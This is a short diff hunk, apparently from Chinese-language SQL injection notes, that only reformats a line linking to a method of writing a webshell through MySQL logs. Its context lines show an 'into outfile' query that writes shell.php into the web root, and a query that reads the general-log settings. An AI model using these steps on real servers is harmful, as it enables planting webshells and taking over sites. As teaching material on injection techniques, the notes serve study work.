@@ -239,8 +239,8 @@ http://www.cnblogs.com/lcamry/p/5729087.html
 2. select version() into outfile "/var/www/html/shell.php" LINES TERMINATED BY 16进制代码
 第二种是利用的文件结尾符
  
-<br />
-<a href="http://blog.cora-lab.org/287.html">利用日志写shell</a>:适用于outfile被过滤，或者禁止写入文件，但要root权限
+<a href="http://blog.cora-lab.org/287.html">利用日志写shell</a>:
+适用于outfile被过滤，或者禁止写入文件，但要root权限
 客户端下:
 ```php
 show variables like '%general%';  查看配置
